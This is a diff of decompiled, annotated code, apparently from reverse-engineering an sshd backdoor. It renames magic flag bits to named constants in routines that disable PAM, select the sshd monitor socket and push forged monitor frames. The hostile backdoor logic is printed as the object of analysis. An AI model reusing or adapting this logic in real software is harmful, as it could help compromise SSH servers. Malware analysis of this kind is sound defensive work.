@@ -193,7 +193,7 @@ LAB_0010843f:
 LAB_0010845f:
   if ((args->cmd_type < MONITOR_CMD_SYSTEM_EXEC) || (args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE))
   {
-    if ((cmd_args->control_flags & 0x40) != 0) {
+    if ((cmd_args->control_flags & CMD_CTRL_DISABLE_PAM) != 0) {
       if (sshd_ctx->use_pam_ptr == (int *)0x0) {
         return FALSE;
       }
@@ -475,7 +475,7 @@ LAB_00108861:
                 return FALSE;
               }
               // AutoDoc: Without an explicit socket override, call `sshd_get_monitor_comm_fd`; otherwise honour the encoded socket selector bits.
-              if ((cmd_args->control_flags & 0x20) == 0) {
+              if ((cmd_args->control_flags & CMD_CTRL_FORCE_SOCKET_PROBE) == 0) {
                 success = sshd_get_monitor_comm_fd(ctx,&monitor_fd,1,DIR_WRITE);
               }
               else {
@@ -532,7 +532,7 @@ LAB_001088b7:
                 if (success == FALSE) {
                   return FALSE;
                 }
-                ctx->exit_flag = cmd_args->control_flags & 1;
+                ctx->exit_flag = cmd_args->control_flags & CMD_CTRL_EXIT_AFTER_DISPATCH;
               }
               // AutoDoc: Push the forged monitor frame across the target fd; any short write aborts the run.
               io_result = fd_write_full(status,request_words,payload_size,libc_funcs);
@@ -563,7 +563,7 @@ LAB_001089b5:
                 if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010897e;
                 if ((cmd_args->request_flags & 0x20) != 0) goto LAB_001089b5;
               }
-              if (-1 < (char)cmd_args->control_flags) {
+              if ((cmd_args->control_flags & CMD_CTRL_WAIT_FOR_REPLY) == 0) {
                 return TRUE;
               }
 LAB_0010897e:
